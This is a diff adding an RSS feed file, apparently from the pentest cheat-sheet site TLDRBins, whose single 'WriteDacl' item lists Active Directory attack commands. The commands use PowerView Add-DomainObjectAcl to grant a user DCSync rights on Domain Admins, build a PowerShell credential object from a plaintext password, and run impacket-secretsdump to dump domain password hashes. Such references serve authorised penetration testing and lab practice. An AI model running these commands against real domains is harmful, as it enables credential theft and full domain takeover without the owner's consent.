@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>WriteDacl on TLDRBins</title>
+    <link>https://tldrbins.github.io/@writedacl/</link>
+    <description>Recent content in WriteDacl on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@writedacl/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>WriteDacl</title>
+      <link>https://tldrbins.github.io/writedacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writedacl/</guid>
+      <description> Add dcsync right to user . .\PowerView.ps1 Authenticated Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync -Credential $Cred Dcsync attack impacket-secretsdump username:password@10.10.11.10 </description>
+    </item>
+  </channel>
+</rss>
